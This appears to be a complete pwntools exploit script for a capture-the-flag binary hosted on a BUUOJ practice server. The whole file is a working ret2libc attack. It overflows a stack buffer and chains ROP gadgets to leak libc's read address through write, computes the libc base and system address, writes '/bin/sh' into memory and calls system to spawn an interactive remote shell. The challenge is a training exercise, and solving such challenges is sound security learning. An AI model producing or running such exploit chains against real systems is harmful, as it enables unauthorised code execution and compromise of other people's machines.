from pwn import *

context.log_level = "info"
context.arch = "amd64"
context.os = "linux"

elf = ELF("./level3_x64")
pop_rdi_ret = 0x00000000004006b3 # pop rdi ; ret
pop_rsi_pop_r15_ret = 0x00000000004006b1 # pop rsi ; pop r15 ; ret

libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
#sock = process(elf.path)
sock = remote("node4.buuoj.cn",25873)
gs = """
    break *0x400619
    continue
"""
#sock = gdb.debug(elf.path, gdbscript = gs)

def leak(addr):
    payload = b"A" * 0x88
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(addr)
    payload += p64(0)
    payload += p64(elf.plt["write"])
    payload += p64(elf.sym["_start"])
    sock.sendafter(b"Input:\n",payload)
    sock.send(payload)
    sleep(0.01)
    leaked = sock.recv(8)
    return u64(leaked)

def attack1(addr):
    payload = b"A" * 0x88
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(addr)
    payload += p64(0)
    payload += p64(elf.plt["write"])


    payload += p64(pop_rdi_ret)
    payload += p64(0)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(0x600aa0)
    payload += p64(0)
    payload += p64(elf.plt["read"])

    payload += p64(elf.sym["_start"])
    sock.sendafter(b"Input:\n",payload)
    sleep(0.01)
    leaked = sock.recv(8)

    sleep(0.01)
    sock.send(b"/bin/sh\x00")
    return u64(leaked)

def attack2():
    payload = b"A"* 0x88
    payload += p64(pop_rdi_ret)
    payload += p64(0x600aa0)
    payload += p64(system_addr)
    sock.sendafter(b"Input:\n",payload)


#print(leak(elf.got["write"]))
#read_got_addr = leak(elf.got["read"])
read_got_addr = attack1(elf.got["read"])
libc_base_addr = read_got_addr - libc.sym["read"]
success("libc_base_addr -> {:#x}".format(libc_base_addr))
system_addr = libc_base_addr + libc.sym["system"]

attack2()


sock.interactive()




    

